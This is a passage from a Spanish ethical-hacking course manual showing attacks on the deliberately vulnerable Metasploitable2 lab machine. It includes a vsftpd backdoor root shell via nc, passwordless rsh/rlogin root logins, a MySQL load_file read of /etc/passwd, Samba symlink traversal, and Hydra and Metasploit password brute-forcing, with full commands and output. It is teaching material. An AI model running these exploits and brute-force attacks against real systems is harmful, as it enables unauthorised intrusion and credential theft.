> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital meterpreter > download meterpreter > upload meterpreter > execute meterpreter > shell meterpreter > session 9.5 Explotar Vulnerabilidades de Metasploitable2 Vulnerabilidad vsftpd Smiley Face Backdoor https://www.exploit-db.com/exploits/17491/ https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor Análisis La versión de vsftpd en funcionamiento en el sistema remoto ha sido compilado con una puerto trasera. Al intentar autenticarse con un nombre de usuario conteniendo un :) (Carita sonriente) ejecuta una puerta trasera, el cual genera una shell atendiendo en el puerto TCP 6200. El shell detiene su atención después de que el cliente se conecta y desconecta.
>
> Un atacante remoto sin autenticación puede explotar esta vulnerabilidad para ejecutar código arbitrario como root. root@kali:~# ftp 192.168.1.34 Connected to 192.168.1.34. 220 (vsFTPd 2.3.4) Name (192.168.1.34:root): usuario:) 331 Please specify the password. Password
>
> ^Z [3]+ Stopped ftp 192.168.1.34 root@kali:~# bg 3 [3]+ ftp 192.168.1.34 & root@kali:~# nc -nvv 192.168.1.34 6200 (UNKNOWN) [192.168.1.34] 6200 (?) open id uid=0(root) gid=0(root) Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 58
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Vulnerabilidad Samba NDR MS-RPC Request Heap-Based Remote Buffer Overflow https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2007-2446 https://www.rapid7.com/db/vulnerabilities/cifs-samba-ms-rpc-bof Análisis Esta versión del servidor Samba instalado en el host remoto está afectado por varias vulnerabilidades de desbordamiento de pila, el cual puede ser explotado remotamente para ejecutar código con los privilegios del demonio Samba.
>
> root@kali:~# /etc/init.d/postgresql start [ ok ] Starting PostgreSQL 9.1 database server: main. root@kali:~# msfconsole msf > search lsa_io_privilege_set Heap Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/dos/samba/lsa_addprivs_heap normal Samba lsa_io_privilege_set Heap Overflow msf > use auxiliary/dos/samba/lsa_addprivs_heap msf auxiliary(lsa_addprivs_heap) > show options Module options (auxiliary/dos/samba/lsa_addprivs_heap)
>
> Name Current Setting Required Description ---- --------------- -------- ----------- RHOST yes The target address RPORT 445 yes Set the SMB service port SMBPIPE LSARPC yes The pipe name to use msf auxiliary(lsa_addprivs_heap) > set RHOST 192.168.1.34 RHOST => 192.168.1.34 msf auxiliary(lsa_addprivs_heap) > exploit Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 59
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital [*] Connecting to the SMB service... [*] Binding to 12345778-1234-abcd-ef00- 0123456789ab:0.0@ncacn_np:192.168.1.34[\lsarpc] ... [*] Bound to 12345778-1234-abcd-ef00- 0123456789ab:0.0@ncacn_np:192.168.1.34[\lsarpc] ...
>
> [*] Calling the vulnerable function... [-] Auxiliary triggered a timeout exception [*] Auxiliary module execution completed msf auxiliary(lsa_addprivs_heap) > exploit Vulnerabilidad rsh Unauthenticated Acces (via finger information) https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-2012-6392 Análisis Utilizando nombres de usuario comunes como también nombres de usuarios reportados por “finger”.
>
> Es posible autenticarse mediante rsh. Ya sea las cuentas no están protegidas con contraseñas o los archivos ~/.rhosts o están configuradas adecuadamente. Esta vulnerabilidad está confirmada de existir para Cisco Prime LAN Management Solution, pero puede estar presente en cualquier host que no este configurado de manera segura.
>
> root@kali:~# rsh -l root 192.168.1.34 /bin/bash w 22:42:00 up 1:30, 2 users, load average: 0.04, 0.02, 0.00 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT msfadmin tty1 - 21:13 1:19 7.01s 0.02s /bin/login -- root pts/0 :0.0 21:11 1:30 0.00s 0.00s -bash id uid=0(root) gid=0(root) groups=0(root) Vulnerabilidad VNC Server 'password' Password Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 60
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Análisis El servidor VNC funcionando en el host remoto está asegurado con una contraseña muy débil. Es posible autenticarse utilizando la contraseña 'password'. Un atacante remoto sin autenticar puede explotar esto para tomar control del sistema.
>
> Imagen 9-6. Conexión mediante VNC a Metasploitable2, utilizando una contraseña débil root@kali:~# vncviewer [Dirección IP] Connected to RFB server, using protocol version 3.3 Performing standard VNC authentication Password: Authentication successful Desktop name "root's X desktop (metasploitable:0)" Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 61
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital VNC server default format: 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using default colormap which is TrueColor. Pixel format
>
> 32 bits per pixel. Least significant byte first in each pixel. True colour: max red 255 green 255 blue 255, shift red 16 green 8 blue 0 Using shared memory PutImage Vulnerabilidad MySQL Unpassworded Account Check Análisis Es posible conectarse a la base de datos MySQL remota utilizando una cuenta sin contraseña. Esto puede permitir a un atacante a lanzar ataques contra la base de datos.
>
> Con Metasploit Framework: msf > search mysql_sql Matching Modules ================
>
> Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/mysql/mysql_sql normal MySQL SQL Generic Query msf > use auxiliary/admin/mysql/mysql_sql msf auxiliary(mysql_sql) > show options Module options (auxiliary/admin/mysql/mysql_sql)
>
> Name Current Setting Required Description ---- --------------- -------- ----------- PASSWORD no The password for the specified username RHOST yes The target address Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 62
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital RPORT 3306 yes The target port SQL select version() yes The SQL to execute. USERNAME no The username to authenticate as msf auxiliary(mysql_sql) > set USERNAME root USERNAME => root msf auxiliary(mysql_sql) > set RHOST [Dirección IP] RHOST => 192.168.1.34 msf auxiliary(mysql_sql) > set SQL select load_file(\'/etc/passwd\') SQL => select load_file('/etc/passwd') msf auxiliary(mysql_sql) > run [*] Sending statement: 'select load_file('/etc/passwd')'...
>
> [*] | root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh dhcp:x:101:102::/nonexistent:/bin/false syslog:x:102:103::/home/syslog:/bin/false klog:x:103:104::/home/klog:/bin/false sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash bind:x:105:113::/var/cache/bind:/bin/false postfix:x:106:115::/var/spool/postfix:/bin/false ftp:x:107:65534::/home/ftp:/bin/false postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false distccd:x:111:65534::/:/bin/false user:x:1001:1001:just a user,111,,:/home/user:/bin/bash service:x:1002:1002:,,,:/home/service:/bin/bash telnetd:x:112:120::/nonexistent:/bin/false proftpd:x:113:65534::/var/run/proftpd:/bin/false statd:x:114:65534::/var/lib/nfs:/bin/false snmp:x:115:65534::/var/lib/snmp:/bin/false Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 63
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital | [*] Auxiliary module execution completed msf auxiliary(mysql_sql) > Manualmente: root@kali:~# mysql -h 192.168.1.34 -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \g.
>
> Your MySQL connection id is 7 Server version: 5.0.51a-3ubuntu5 (Ubuntu) Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners.
>
> Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
>
> ```bash
> mysql> show databases;
> ```
>
> +--------------------+ | Database | +--------------------+ | information_schema | | dvwa | | metasploit | | mysql | | owasp10 | | tikiwiki | | tikiwiki195 | +--------------------+ 7 rows in set (0.00 sec)
>
> ```bash
> mysql> use information_schema
> ```
>
> Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed
>
> ```bash
> mysql> show tables;
> ```
>
> +---------------------------------------+ | Tables_in_information_schema | +---------------------------------------+ | CHARACTER_SETS | | COLLATIONS | | COLLATION_CHARACTER_SET_APPLICABILITY | Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 64
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital | COLUMNS | | COLUMN_PRIVILEGES | | KEY_COLUMN_USAGE | | PROFILING | | ROUTINES | | SCHEMATA | | SCHEMA_PRIVILEGES | | STATISTICS | | TABLES | | TABLE_CONSTRAINTS | | TABLE_PRIVILEGES | | TRIGGERS | | USER_PRIVILEGES | | VIEWS | +---------------------------------------+ 17 rows in set (0.00 sec) Vulnerabilidad rlogin Service Detection https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-1999-0651 Análisis El host remoto está ejecutando el servicio 'rlogin'. Este servicio es peligroso en el sentido que no es cifrado- es decir, cualquiera puede interceptar los datos que pasen a través del cliente rlogin y el servidor rlogin. Esto incluye logins y contraseñas.
>
> También, esto puede permitir una autenticación pobrle sin contraseñas. Si el host es vulnerable a la posibilidad de adivinar el número de secuencia TCP (Desde cualquier Red) o IP Spoofing (Incluyendo secuestro ARP sobre la red local) entonces puede ser posible evadir la autenticación.
>
> Finalmente, rlogin es una manera sencilla de activar el acceso de escritura un archivo dentro de autenticaciones completas mediante los archivos .rhosts o rhosts.equiv. root@kali:~# rlogin -l root 192.168.1.34 Last login: Thu Jul 11 21:11:40 EDT 2013 from :0.0 on pts/0 Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 The programs included with the Ubuntu system are free software; Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 65
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law.
>
> To access official Ubuntu documentation, please visit: http://help.ubuntu.com/ You have new mail. root@metasploitable:~# Vulnerabilidad rsh Service Detection https://www.cvedetails.com/cve-details.php?t=1&cve_id=CVE-1999-0651 Análisis El host remoto está ejecutando el servicio 'rsh'. Este servicio es peligroso en el sentido que no es cifrado- es decir, cualquiera puede interceptar los datos que pasen a través del cliente rlogin y el servidor rlogin. Esto incluye logins y contraseñas.
>
> También, esto puede permitir una autenticación pobrle sin contraseñas. Si el host es vulnerable a la posibilidad de adivinar el número de secuencia TCP (Desde cualquier Red) o IP Spoofing (Incluyendo secuestro ARP sobre la red local) entonces puede ser posible evadir la autenticación.
>
> Finalmente, rsh es una manera sencilla de activar el acceso de escritura un archivo dentro de autenticaciones completas mediante los archivos .rhosts o rhosts.equiv. msf> search rsh_login Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/scanner/rservices/rsh_login normal rsh Authentication Scanner Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 66
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital msf> use auxiliary/scanner/rservices/rsh_login msf auxiliary(rsh_login) > set RHOSTS 192.168.1.34 RHOSTS => 192.168.1.34 msf auxiliary(rsh_login) > set USER_FILE /opt/metasploit/apps/pro/msf3/data/wordlists/rservices_from_users.txt USER_FILE => /opt/metasploit/apps/pro/msf3/data/wordlists/rservices_from_users.txt msf auxiliary(rsh_login) > run [*] 192.168.1.34:514 - Starting rsh sweep [*] 192.168.1.34:514 RSH - Attempting rsh with username 'root' from 'root' [+] 192.168.1.34:514, rsh 'root' from 'root' with no password.
>
> [*] Command shell session 1 opened (192.168.1.38:1023 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'daemon' from 'root' [+] 192.168.1.34:514, rsh 'daemon' from 'root' with no password. [*] Command shell session 2 opened (192.168.1.38:1022 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'bin' from 'root' [+] 192.168.1.34:514, rsh 'bin' from 'root' with no password.
>
> [*] Command shell session 3 opened (192.168.1.38:1021 -> 192.168.1.34:514) at-11 21:54:18 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username 'nobody' from 'root' [+] 192.168.1.34:514, rsh 'nobody' from 'root' with no password. [*] Command shell session 4 opened (192.168.1.38:1020 -> 192.168.1.34:514) at-11 21:54:19 -0500 [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'root' [-] Result: Permission denied.
>
> [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'daemon' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'bin' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'nobody' [-] Result: Permission denied.
>
> [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from '+' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'guest' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username '+' from 'mail' [-] Result: Permission denied.
>
> [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'root' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'daemon' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'bin' [-] Result: Permission denied.
>
> [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'nobody' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from '+' [-] Result: Permission denied. Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 67
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'guest' [-] Result: Permission denied. [*] 192.168.1.34:514 RSH - Attempting rsh with username 'guest' from 'mail' [-] Result: Permission denied.
>
> [*] 192.168.1.34:514 RSH - Attempting rsh with username 'mail' from 'root' [+] 192.168.1.34:514, rsh 'mail' from 'root' with no password. [*] Command shell session 5 opened (192.168.1.38:1019 -> 192.168.1.34:514) at-11 21:54:20 -0500 [*] Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed msf auxiliary(rsh_login) > Vulnerabilidad Samba Symlink Traveral Arbitrary File Access (unsafe check) https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0926 Análisis El servidor Samba remoto está configurado de manera insegura y permite a un atacante remoto a obtener acceso de lectura o posiblemente de escritura a cualquier archivo sobre el host afectado.
>
> Especialmente, si un atacante tiene una cuenta válida en Samba para recurso compartido que es escribible o hay un recurso escribile que está configurado con una cuenta de invitado, puede crear un enlace simbólico utilizando una secuencia de recorrido de directorio y ganar acceso a archivos y directorios fuera del recurso compartido.
>
> Una explotación satisfactoria requiera un servidor Samba con el parámetro 'wide links' definido a 'yes', el cual es el estado por defecto. Obtener Recursos compartidos del Objetivo
>
> ```bash
> # smbclient -L \\192.168.1.34
> ```
>
> Enter root's password: Anonymous login successful Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian] Sharename Type Comment --------- ---- ------- Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 68
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (metasploitable server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (metasploitable server (Samba 3.0.20-Debian)) Anonymous login successful Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian] Server Comment --------- ------- METASPLOITABLE metasploitable server (Samba 3.0.20-Debian) RYDS ryds server (Samba, Ubuntu) Workgroup Master --------- ------- WORKGROUP RYDS Con Metasploit Framework msf> search symlink Matching Modules ================ Name Disclosure Date Rank Description ---- --------------- ---- ----------- auxiliary/admin/smb/samba_symlink_traversal normal Samba Symlink Directory Traversal msf> use auxiliary/admin/smb/samba_symlink_traversal msf auxiliary(samba_symlink_traversal) > set RHOST 192.168.1.34 RHOST => 192.168.1.34 msf auxiliary(samba_symlink_traversal) > set SMBSHARE tmp SMBSHARE => tmp msf auxiliary(samba_symlink_traversal) > exploit [*] Connecting to the server...
>
> [*] Trying to mount writeable share 'tmp'... [*] Trying to link 'rootfs' to the root filesystem... [*] Now access the following share to browse the root filesystem: [*] \\192.168.1.34\tmp\rootfs\ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 69
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital [*] Auxiliary module execution completed msf auxiliary(samba_symlink_traversal) > Ahora desde otra consola: root@kali:~# smbclient //192.168.1.34/tmp/ Enter root's password
>
> Anonymous login successful Domain=[WORKGROUP] OS=[Unix] Server=[Samba 3.0.20-Debian] smb: \> dir . D 0 Thu Jul 11 22:39:20 2013 .. DR 0 Sun May 20 13:36:12 2012 .ICE-unix DH 0 Thu Jul 11 20:11:25 2013 5111.jsvc_up R 0 Thu Jul 11 20:11:52 2013 .X11-unix DH 0 Thu Jul 11 20:11:38 2013 .X0-lock HR 11 Thu Jul 11 20:11:38 2013 rootfs DR 0 Sun May 20 13:36:12 2012 56891 blocks of size 131072. 41938 blocks available smb: \> cd rootfs\ smb: \rootfs\> dir . DR 0 Sun May 20 13:36:12 2012 .. DR 0 Sun May 20 13:36:12 2012 initrd DR 0 Tue Mar 16 17:57:40 2010 media DR 0 Tue Mar 16 17:55:52 2010 bin DR 0 Sun May 13 22:35:33 2012 lost+found DR 0 Tue Mar 16 17:55:15 2010 mnt DR 0 Wed Apr 28 15:16:56 2010 sbin DR 0 Sun May 13 20:54:53 2012 initrd.img R 7929183 Sun May 13 22:35:56 2012 home DR 0 Fri Apr 16 01:16:02 2010 lib DR 0 Sun May 13 22:35:22 2012 usr DR 0 Tue Apr 27 23:06:37 2010 proc DR 0 Thu Jul 11 20:11:09 2013 root DR 0 Thu Jul 11 20:11:37 2013 sys DR 0 Thu Jul 11 20:11:10 2013 boot DR 0 Sun May 13 22:36:28 2012 nohup.out R 67106 Thu Jul 11 20:11:38 2013 etc DR 0 Thu Jul 11 20:11:35 2013 dev DR 0 Thu Jul 11 20:11:26 2013 vmlinuz R 1987288 Thu Apr 10 11:55:41 2008 opt DR 0 Tue Mar 16 17:57:39 2010 var DR 0 Sun May 20 16:30:19 2012 cdrom DR 0 Tue Mar 16 17:55:51 2010 tmp D 0 Thu Jul 11 22:39:20 2013 srv DR 0 Tue Mar 16 17:57:38 2010 Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 70
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital 56891 blocks of size 131072. 41938 blocks available smb: \rootfs\> Imagen 9-7. Conexión al recurso compartido \rootfs\ donde ahora reside la raíz de Metasploitable2 Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 71
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 10. Atacar Contraseñas
>
> Cualquier servicio de red el cual solicite un usuario y contraseña es vulnerable a intentos para tratar de adivinar credenciales válidas. Entre los servicios más comunes se enumeran; ftp, ssh, telnet, vnc, rdp, entre otros. Un ataque de contraseñas en línea implica automatizar el proceso de adivinar las credenciales para acelerar el ataque y mejorar las probabilidades de adivinar alguna de ellas.
>
> THC Hydra https://github.com/vanhauser-thc/thc-hydra THC-Hydra es una herramienta de código prueba de concepto, el cual proporciona a los investigadores y consultores en seguridad, la posibilidad de mostrar cuan fácil podría ser ganar acceso no autorizado hacia un sistema.
>
> Existen diversas herramientas disponibles para atacar logins disponibles, sin embargo ninguna soporta más de un protocolo a atacar o conexiones en paralelo. Actualmente la herramienta soporta los siguientes protocolos; Asterisk, AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-POST, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTPS-POST, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, RTSP, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP v1+v2+v3, SOCKS5, SSH (v1 and v2), SSHKEY, Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC y XMPP.
>
> Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 72
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 10-1. Finaliza la ejecución de THC-Hydra 10.1 Adivinar Contraseñas de MySQL https://www.mysql.com/ MySQL es un software el cual entrega un servidor para bases de datos SQL (Structured QueryLanguafg), rápido, multi-tarea, multi-usuario, y robusto. El servidor MySQL está diseñado para sistemas de producción de misión crítica y de carga crítica, como también para la integración en software desplegado en masa.
>
> Para los siguientes ejemplos se utilizará el módulo auxiliar de nombre “MySQL Login Utility” en Metasploit Framework, el cual permite realizar consultas sencillas hacia la instancia MySQL por usuarios y contraseñas específicos (Por defecto es el usuario root con la contraseña en blanco).
>
> Se define una lista de palabras de posibles usuarios y otra lista de palabras de posibles contraseñas.
>
> ```bash
> # msfconsole
> ```
>
> msf > search mysql Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 73
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital msf > use auxiliary/scanner/mysql/mysql_login msf auxiliary(mysql_login) > show options msf auxiliary(mysql_login) > set RHOSTS [IP_Objetivo] msf auxiliary(mysql_login) > set USER_FILE /usr/share/metasploit framework/data/wordlists/unix_users.txt msf auxiliary(mysql_login) > set PASS_FILE /usr/share/metasploit- framework/data/wordlists/unix_passwords.txt msf auxiliary(mysql_login) >exploit Se anula la definición para la lista de palabras de posibles contraseñas. El módulo tratará de autenticarse al servicio MySQL utilizando los usuarios contenidos en el archivo pertinente, como las posibles contraseñas.
>
> msf auxiliary(mysql_login) > unset PASS_FILE msf auxiliary(mysql_login) > set USER_FILE /root/users_metasploit msf auxiliary(mysql_login) > run msf auxiliary(mysql_login) > back Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 74
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 10-2. Ejecución del módulo auxiliar mysql_login. 10.2 Adivinar Contraseñas de PostgreSQL https://www.postgresql.org/ PostgreSQL es un poderoso sistema para bases de datos objeto-relacional de fuente abierta, con más de 30 años de desarrollo activo, lo cual le ha valido una reputación de fiabilidad y características de robustez y desempeño.
>
> Para el siguiente ejemplo se utilizará el módulo auxiliar de nombre “PostgreSQL Login Utility” en Metasploit Framework, el cual intentará autenticarse contra una instancia PostgreSQL utilizando combinaciones de usuarios y contraseñas indicados por las opciones USER_FILE, PASS_FILE y USERPASS_FILE.
>
> msf > search postgresql msf> use auxiliary/scanner/postgres/postgres_login msf auxiliary(postgres_login) > show options Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 75
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital msf auxiliary(postgres_login) > set RHOSTS [IP_Objetivo] msf auxiliary(postgres_login) > set USER_FILE /usr/share/metasploit- framework/data/wordlists/postgres_default_user.txt msf auxiliary(postgres_login) > set PASS_FILE /usr/share/metasploit- framework/data/wordlists/postgres_default_pass.txt msf auxiliary(postgres_login) > run msf auxiliary(postgres_login) > back Imagen 10-3. Ejecución del módulo auxiliar postgres_login 10.3 Adivinar Contraseñas de Tomcat http://tomcat.apache.org/ Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 76
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Apache Tomcat es una implementación open source de Java Servlet, páginas JavaServer, Lenguaje de Expresión Java y tecnologías WebSocket. El software Apache Tomcat potencia numerosas aplicaciones web de misión críticas de gran escala, en una amplia diversidad de industrias y organizaciones.
>
> msf > search tomcat msf> use auxiliary/scanner/http/tomcat_mgr_login msf auxiliary(tomcat_mgr_login) > show options msf auxiliary(tomcat_mgr_login) > set RHOSTS [IP_Objetivo] msf auxiliary(tomcat_mgr_login) > set RPORT 8180 msf auxiliary(tomcat_mgr_login) > set USER_FILE /usr/share/metasploit- framework/data/wordlists/tomcat_mgr_default_users.txt
>
> msf auxiliary(tomcat_mgr_login) > set PASS_FILE /usr/share/metasploit- framework/data/wordlists/tomcat_mgr_default_pass.txt msf auxiliary(tomcat_mgr_login) > exploit msf auxiliary(tomcat_mgr_login) > back Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 77
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital Imagen 10-4. Ejecución del módulo auxiliar tomcat_mgr_login Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 78
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ### 11. Demostración de Explotación & Post
>
> Explotación Las demostraciones presentadas a continuación permiten afianzar la utilización de algunas herramientas presentadas durante el Curso. Estas demostraciones se centran en la fase de Explotación y Post-Explotación, es decir los procesos que un atacante realizaría después de obtener acceso al sistema mediante la explotación de una vulnerabilidad.
>
> 11.1 Demostración utilizando un exploit local para escalar privilegios. Abrir con VMWare Player las máquina virtuales de Kali Linux y Metsploitable 2 Abrir una nueva terminal y ejecutar WireShark . Escanear todo el rango de la red
>
> ```bash
> # nmap -n -sn 192.168.1.0/24
> ```
>
> Escaneo de Puertos
>
> ```bash
> # nmap -n -Pn -p- 192.168.1.34 -oA escaneo_puertos
> ```
>
> Colocamos los puertos abiertos descubiertos hacia un archivo
>
> ```bash
> # grep open escaneo_puertos.nmap | cut -d “ ” -f 1 | cut -d “/” -f 1 | sed “s/
> ```
>
> $/,/g” > listapuertos
>
> ```bash
> # tr -d '\n' < listapuertos > puertos
> ```
>
> Escaneo de Versiones Copiar y pegar la lista de puertos descubiertos en la fase anterior en el siguiente comando: Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 79
>
> Alonso Eduardo Caballero Quezada - Instructor y Consultor en Hacking Ético & Forense Digital
>
> ```bash
> # nmap -n -Pn -sV -p[puertos] 192.168.1.34 -oA escaneo_versiones
> ```
>
> Obtener la Huella del Sistema Operativo
>
> ```bash
> # nmap -n -Pn -p- -O 192.168.1.34
> ```
>
> Enumeración de Usuarios Proceder a enumerar usuarios válidos en el sistema utilizando el protocolo SMB con nmap
>
> ```bash
> # nmap -n -Pn –script smb-enum-users -p445 192.168.1.34 -oA escaneo_smb
> # ls -l escaneo*
> ```
>
> Se filtran los resultados para obtener una lista de usuarios del sistema.
>
> ```bash
> # grep METASPLOITABLE escaneo_smb.nmap | cut -d “\\” -f 2 | cut -d “ ” -f 1 >
> ```
>
> usuarios Cracking de Contraseñas Utilizar THC-Hydra para obtener la contraseña de alguno de los nombre de usuario obtenidos.
>
> ```bash
> # hydra -L usuarios -e ns 192.168.1.34 -t 3 ssh
> ```
>
> Ganar Acceso Se procede a utilizar uno de los usuarios y contraseñas obtenidas para conectarse a Metasploitable2 Sitio Web: www.ReYDeS.com -:- e-mail: ReYDeS@gmail.com -:- Teléfono: +51 949304030 80
>
> > **💡 📚 Document extens (98 pàgines)**
> > S'han mostrat les primeres 80 pàgines completes del manual.
